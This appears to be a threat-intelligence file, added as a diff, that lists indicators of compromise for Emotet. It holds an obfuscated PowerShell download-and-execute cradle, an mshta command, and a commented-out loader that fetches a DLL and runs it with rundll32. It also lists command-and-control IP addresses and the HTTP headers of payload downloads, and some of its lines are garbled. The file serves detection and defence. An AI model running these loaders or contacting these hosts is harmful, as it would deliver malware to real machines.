@@ -1,0 +1,121 @@
+Latest IOCs of Emotet Malware
+
+ps1.dropper
+http://92.255.57.195/sec/se1.png
+
+"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"  -noexit 
+http://salamrejo-selopampang.temanggungkab.go.id/assets/785036814_0210/
+
+$c1='(New-Object Net.We'.replace('', ''); 
+$c4='bClient).Downlo'.replace('', ''); 
+$c3=''.replace('', '');
+$JI=($c1,$c4,$c3 -Join '');
+I`E`X $JI|I`E`X 
+
+http://0x5cff39c3/sec/se1.html
+mshta  http://0x5cff39c3/sec/se1.html
+
+
+New-Object Net.WebClient.DownloadString('http://92.255.57.195/sec/se1.png')
+
+#$path ='C[.] Users\ Public\ Documents\sed[.] d11';
+#$url1 = 'hxxp://seven-lines[.] com/wo-includes/ORGNP4XUSR2Ps/1';
+#$ur12 = 'hxxp://quranthemepark[.]com/wp-content/Oalz2gBtm/';
+#$ur13 = 'hxxp://vnvoron[.] xvz/cgi-bin/AimOYIHrf?i/1';
+#$ur14 = 'hxxps://kaartinen[.]org/wp-admin/VErvaxko15alxt22s/1';
+#$urls = 'hxxp://hrlinkedasia[.] com/b/1B2L1';
+#$url6 = 'hxxp://ntu$t-arch-2021-api[.]monoame[.] com/licenses/e74DI:6t/1';
+#$ur17 = 'hxxp: //customtshirt[.]sogoflowers[.]com/cgi-bin/wzEOjYNaL';
+#$ur18 = 'hxxp//al rumavuh[.] com/V7cPVVEy /97MNaV/1';
+#$url19= 'hxxp: //wordpress15, aftershipdemo,com/wordpress/fGmhYvSkeBuJu/!';
+#$url10 ='hxxps://vihgov[.] vip/images/yQ8scBrDeQREHL';
+#web = New-object net[.]webclient:
+#$urls
+#"$ur11, $url2, $url3, $url4, $ur15, $url6, $url7, $url8, $ur19, $url10"[.]split (", ") :
+#foreach ($url in $urls) {
+#try {
+#  $web[.] Downloadfile (Surl, Spath);
+#  if ((Get-Item Spath) [.] Length -ge 30000) {
+#  [Diagnostics[.] Process]:
+#    break;
+#    }
+#  }
+#catcht{}
+#}
+#sleep -s 4cmd /c C:\Windows\syswow64\rundll32[.]exe 'C: \Users\ Public\Documents\ssd[.]dll',Anystring;
+
+IP:
+45.138.98.34:80
+69.16.218.101:8080
+51.210.242.234:8080
+185.148.168.220:8080
+142.4.219.173:8080
+54.38.242.185:443
+191.252.103.16:80
+104.131.62.48:8080
+62.171.178.147:8080
+217.182.143.207:443
+168.197.250.14:80
+37.44.244.177:8080
+66.42.57.149:443
+210.57.209.142:8080
+159.69.237.188:443
+116.124.128.206:8080
+128.199.192.135:8080
+195.154.146.35:443
+185.148.168.15:8080
+195.77.239.39:8080
+207.148.81.119:8080
+85.214.67.203:8080
+190.90.233.66:443
+78.46.73.125:443
+78.47.204.80:443
+37.59.209.141:8080
+54.37.228.122:443
+
+
+Sample header :
+Remote address:
+92.255.57[.]195:80
+Request
+GET /sec/se1.png HTTP/1.1
+Host: 92.255.57[.]195
+Connection: Keep-Alive
+Response
+HTTP/1.1 200 OK
+Date: Wed, 19 Jan 2022 21:33:48 GMT
+Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips
+mod_fcgid/2.3.9 PHP/5.4.16
+Last-Modified: Wed, 19 Jan 2022 18:27:22 GMT
+ETag: "430-5d5f3895e9680"
+Accept-Ranges: bytes
+Content-Length: 1072
+Emotet- Trojan Malware dropper via Email
+Jan 2022
+v1.0
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: image/png
+Remote address:
+178.208.83[.]22:80
+Request
+GET /wp-includes/QEGNF4XUSR2Ps/ HTTP/1.1
+Host: seven-lines[.]com
+Connection: Keep-Alive
+Response
+HTTP/1.1 200 OK
+Server: nginx
+Date: Wed, 19 Jan 2022 21:33:48 GMT
+Content-Type: application/x-msdownload
+Content-Length: 616448
+Connection: keep-alive
+Keep-Alive: timeout=5
+X-Powered-By: PHP/5.6.37
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Expires: Wed, 19 Jan 2022 21:33:48 GMT
+Content-Disposition: attachment; filename="5LHWp[.]dll"
+Content-Transfer-Encoding: binary
+Set-Cookie: 61e883bcd74a6=1642628028; expires=Wed, 19-Jan-2022
+21:34:48 GMT; Max-Age=60; path=/
+Last-Modified: Wed, 19 Jan 2022 21:33:48 GMT
